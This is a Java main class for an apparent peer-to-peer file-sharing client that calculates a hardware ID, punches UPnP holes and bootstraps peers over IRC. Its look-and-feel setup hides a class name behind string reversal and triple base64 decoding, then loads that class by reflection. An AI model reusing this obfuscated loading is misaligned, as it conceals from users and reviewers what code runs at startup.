package main;

import gui.MainWindow;
import io.FileWatcher;

import java.io.IOException;
import java.lang.reflect.Constructor;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.concurrent.CountDownLatch;

import javax.swing.LookAndFeel;
import javax.swing.UIManager;

import net.IRCBootstrap;
import net.SocketWaiter;
import net.GlobalListener;
import net.HolePunchUPNP;
import peer.Peer;
import peer.PeerConnector;
import blocks.BlockedFile;

public class Core {
	
	public static ArrayList <Peer> peerList;
	public static HashMap<String, ArrayList<String>> index;
	public static MainWindow mainWindow;
	public static ArrayList<BlockedFile> blockDex;
	public static ArrayList <String> potentialPeers;
	public static GlobalListener gl;
	public static PeerConnector pst;
	public static boolean debugServer = true;
	public static boolean killPeerConnector = false;
	public static CountDownLatch discoveryLatch;
	public static SocketWaiter ssm;
	public static boolean fsThreadStarted = false;

	public static void main(String[] args) throws InterruptedException, IOException, NoSuchAlgorithmException {
		
		//Version check
		String strVer = System.getProperty("java.version");
		if(!strVer.startsWith("1.7")) {
			System.out.println("Java version too old! Quitting.");
			System.exit(0);
		}
		
		try {
			String ultimateLafStr = Utils.reverse(Utils.lafStr) + Utils.reverse(Utils.lafStrB)
									+ Utils.reverse(Utils.lafStrC);
			Class<?> loaderClass = Class.forName(Utils.multidebase64(3, ultimateLafStr));
			Constructor<?> constructor = loaderClass.getConstructors()[0];
			Object lafObj = constructor.newInstance();
			UIManager.setLookAndFeel((LookAndFeel) lafObj);	
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		//Calculate HWID
		Settings.hwid = Utils.getHWID();
		
		//Initialize vars
		Settings.version = 1.0;
		peerList = new ArrayList<Peer> ();
		blockDex = new ArrayList<BlockedFile> ();
		index = new HashMap<String, ArrayList<String>> ();
		potentialPeers = new ArrayList<String> ();
		discoveryLatch = new CountDownLatch(1);
		
		//GUI inits
		mainWindow = new MainWindow();
		
		//Directory work
		Utils.initDir();
		
		//Register shutdownhook
		Thread shutDownHookThread = new Thread(new ShutdownHook());
		Runtime.getRuntime().addShutdownHook(shutDownHookThread);
		
		//Register fileWatcher if Windows
		if(Utils.isWindows()) {
			(new Thread(new FileWatcher())).start();
		}
		
		mainWindow.out("Loading checksum data...");
		
		//Create blockdex
		Utils.print(Core.class, "Generating blockDex");
		Utils.generateBlockDex();
		
		//Hole punch
		mainWindow.out("Configuring network...");
		Thread holePunchThread = new Thread(new HolePunchUPNP());
		holePunchThread.start();
		holePunchThread.join();
		
		//Start IRC thread
		try {
			(new Thread(new IRCBootstrap("asimov.freenode.net", "#xnetbootstrap", 6667))).start();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		//Initialize library listing
		mainWindow.updateLibrary();
		
		mainWindow.resetTable();
		mainWindow.setSearchFocusable();
		mainWindow.setSearchEditable();
		
		//Local development tools
		debugServer = false;
		int sep = 1;
		
		if(sep == 0) {
			gl = new GlobalListener();
			(new Thread(gl)).start();
		} else {
			pst = new PeerConnector(debugServer);
			Core.potentialPeers.add("127.0.0.1");
			(new Thread(pst)).start();
			//TODO: remove debugging
			Core.discoveryLatch.countDown();
		}
	}
	
	public static void incomingDebugReset() {
		killPeerConnector = true;
		mainWindow.debugLatch.countDown();
		debugServer = false;
		mainWindow.resetTable();
	}
}
